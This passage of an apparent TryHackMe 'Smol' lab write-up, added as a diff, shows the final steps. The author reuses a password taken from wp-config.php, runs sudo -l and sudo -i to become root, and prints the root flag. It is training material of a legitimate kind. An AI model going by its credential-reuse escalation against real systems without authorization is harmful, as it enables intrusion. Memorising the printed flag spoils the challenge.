@@ -955,3 +955,42 @@ xavi@ip-10-112-186-157:/home/gege/wordpress.old$
 > [!note]
 > Went straight into wp-config.php to see if I can find a pw and it is Xavi's!
 
+```
+xavi@ip-10-112-186-157:/home/gege/wordpress.old$ sudo -l
+[sudo] password for xavi:
+Matching Defaults entries for xavi on ip-10-112-186-157:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User xavi may run the following commands on ip-10-112-186-157:
+    (ALL : ALL) ALL
+xavi@ip-10-112-186-157:/home/gege/wordpress.old$ cd /
+xavi@ip-10-112-186-157:/$ ls
+bin   dev  home  lib32  libx32      media  opt   root  sbin  swap.img  tmp  var
+boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   sys       usr
+xavi@ip-10-112-186-157:/$ cd root/
+bash: cd: root/: Permission denied
+xavi@ip-10-112-186-157:/$ sudo cd root
+sudo: cd: command not found
+xavi@ip-10-112-186-157:/$ sudo -i
+root@ip-10-112-186-157:~$
+root@ip-10-112-186-157:~$ ls
+total 52K
+drwx------  7 root root 4.0K Jul 20  2025 .
+drwxr-xr-x 18 root root 4.0K Mar  4 14:39 ..
+-rw-r--r--  1 root root 3.2K Jun 21  2023 .bashrc
+drwx------  2 root root 4.0K Jun  2  2023 .cache
+-rw-------  1 root root   35 Mar 29  2024 .lesshst
+drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
+lrwxrwxrwx  1 root root    9 Aug 18  2023 .mysql_history -> /dev/null
+drwxr-xr-x  4 root root 4.0K Aug 16  2023 .phpbrew
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-r-----  1 root root   33 Aug 16  2023 root.txt
+-rw-r--r--  1 root root   75 Aug 17  2023 .selected_editor
+drwx------  3 root root 4.0K Jun 21  2023 snap
+drwx------  2 root root 4.0K Jul 20  2025 .ssh
+-rw-rw-rw-  1 root root 1.5K Jul 20  2025 .viminfo
+root@ip-10-112-186-157:~$ cat root.txt
+bf89ea3ea01992353aef1f576214d4e4
+```
+
+![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolcompleted.png)
